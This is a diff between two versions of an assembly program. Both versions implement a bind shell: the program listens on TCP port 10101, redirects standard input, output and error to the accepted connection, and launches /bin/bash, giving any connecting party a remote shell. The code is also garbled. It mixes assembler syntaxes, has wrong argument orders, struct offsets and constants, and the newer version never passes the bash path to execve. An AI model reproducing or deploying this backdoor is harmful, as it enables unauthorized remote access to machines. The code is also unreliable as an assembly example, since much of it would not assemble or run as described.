@@ -1,90 +1,73 @@
-# Define structure sizes (adjust if needed)
-.equ sin_size, 16
-.equ sock_size, 4
-.equ fd_size, 4
+; Declare global variables in .bss section
+.section .bss
+    sin: .space 12 ; Size of sockaddr_in struct
 
-# Allocate memory for variables
-.comm sin, sin_size, rw  ; Allocate and initialize sin structure with read-write access
-.comm sock, sock_size, rw  ; Allocate and initialize sock variable with read-write access
-.comm fd, fd_size, rw      ; Allocate and initialize fd variable with read-write access
+; Declare global variables in .data section
+.section .data
+    sock: .long 0    ; Socket descriptor
+    fd: .long 0     ; File descriptor for accepted connection
 
-.LC0: .string "/bin/bash"
-
-bash:
-    .quad   .LC0  ; Pointer to "/bin/bash" string
+; Declare global variables in .text section
+.section .text
+    .global main
 
 main:
-    pushq   %rbp  ; Save base pointer
+    ; Create a TCP socket
+    push AF_INET
+    push SOCK_STREAM
+    push IPPROTO_TCP
+    call socket
+    mov sock, eax
 
-    movq    %rsp, %rbp  ; Set base pointer
+    ; Set socket family to AF_INET
+    mov sin, eax
+    mov eax, AF_INET
+    mov [sin + 0], eax
 
-    ; Initialize sin structure (check offset for sin_family on your system)
-    movb    $AF_INET, BYTE PTR sin[0]  ; Store sin_family in the first byte of sin
-    movl    $10101, %edi              ; Set port number
-    call    htons  ; Convert port number to network byte order
-    movw    %ax, WORD PTR sin[2]      ; Store converted port number in sin_port
+    ; Set socket port to 10101
+    mov eax, 10101
+    call htons
+    mov [sin + 4], eax
 
-    ; Create socket
-    movl    $6, %edx       ; AF_INET
-    movl    $1, %esi       ; SOCK_STREAM
-    movl    $2, %edi       ; IPPROTO_TCP
-    call    socket
-    movl    %eax, DWORD PTR sock[rip]  ; Store socket file descriptor
+    ; Bind the socket to the address
+    mov eax, sock
+    mov ebx, sin
+    mov ecx, 12 ; Size of sockaddr_in struct
+    call bind
 
-    ; Bind socket to address
-    movl    sin_size, %edx  ; Size of sockaddr_in structure
-    lea     sin(%rip), %esi  ; Address of sin structure
-    movl    DWORD PTR sock[rip], %edi  ; Socket file descriptor
-    call    bind  ; Bind socket to address
-
-    ; Listen for connections
-    movl    DWORD PTR sock[rip], %eax  ; Socket file descriptor
-    movl    $1, %esi       ; Backlog (number of pending connections)
-    movl    DWORD PTR sock[rip], %edi  ; Socket file descriptor
-    call    listen  ; Listen for incoming connections
+    ; Listen on the socket for connections
+    mov eax, sock
+    mov ecx, 1 ; Maximum number of pending connections
+    call listen
 
     ; Accept a connection
-    movl    DWORD PTR sock[rip], %eax  ; Socket file descriptor
-    movl    $0, %edx       ; Client address (unused here)
-    movl    $0, %esi       ; Client address length (unused here)
-    movl    DWORD PTR sock[rip], %edi  ; Socket file descriptor
-    call    accept  ; Accept an incoming connection
-    movl    %eax, DWORD PTR fd[rip]  ; Store client socket file descriptor
+    mov eax, sock
+    mov ebx, NULL
+    mov ecx, NULL
+    call accept
+    mov fd, eax
 
-    ; Duplicate file descriptors (check error handling for each call)
-    movl    DWORD PTR fd[rip], %eax  ; Client socket file descriptor
-    movl    $0, %esi       ; Standard input (stdin) descriptor
-    movl    DWORD PTR fd[rip], %edi  ; Client socket file descriptor
-    call    dup2
-    cmpl    $0xfffffffffffffffff, %eax  ; Check for error (dup2 returns -1 on failure)
-    jne    error       ; Jump to error handling if dup2 fails
+    ; Duplicate file descriptor for stdin
+    mov eax, fd
+    mov ebx, 0 ; Standard input file descriptor
+    call dup2
 
-    movl    DWORD PTR fd[rip], %eax  ; Client socket file descriptor
-    movl    $1, %esi       ; Standard output (stdout) descriptor
-    movl    DWORD PTR fd[rip], %edi  ; Client socket file descriptor
-    call    dup2
-    cmpl    $0xfffffffffffffffff, %eax  ; Check for error (dup2 returns -1 on failure)
-    jne    error       ; Jump to error handling if dup2 fails
+    ; Duplicate file descriptor for stdout
+    mov eax, fd
+    mov ebx, 1 ; Standard output file descriptor
+    call dup2
 
-    movl    DWORD PTR fd[rip], %eax  ; Client socket file descriptor
-    movl    $2, %esi       ; Standard error (stderr) descriptor
-    movl    DWORD PTR fd[rip], %edi  ; Client socket file descriptor
-    call    dup2
-    cmpl    $0xfffffffffffffffff, %eax  ; Check for error (dup2 returns -1 on failure)
-    jne    error       ; Jump to error handling if dup2 fails
+    ; Duplicate file descriptor for stderr
+    mov eax, fd
+    mov ebx, 2 ; Standard error file descriptor
+    call dup2
 
-    ; Execute bash shell
-    movq    bash(%rip), %rcx  ; Argument array pointer (currently empty)
-    movq    bash(%rip), %rax  ; Program path
-    mov     rdx, NULL                 ; envp (environment variables) - NULL for default environment
-    mov     rsi, %rcx                 ; Argument array pointer
-    mov     rdi, %rax                 ; Program path
-    mov     eax, 0                   ; Arguments for execlp
-    call    execlp                   ; Replace current process with `/bin/bash`
+    ; Execute the /bin/bash program with the accepted connection as its standard input, output, and error
+    mov ebx, [esp + 4] ; Pointer to the first argument (program name)
+    push 0 ; NULL-terminated argument list
+    call execve
 
-error:  ; Add error handling code here (e.g., print error message, exit)
-    mov     eax, 1                   ; Set exit code (modify as needed)
-    popq    %rbp                      ; Restore base pointer
-    ret                             ; Return from main
-
-
+    ; Exit if execve fails
+    mov eax, 1
+    mov ebx, 0
+    int 80
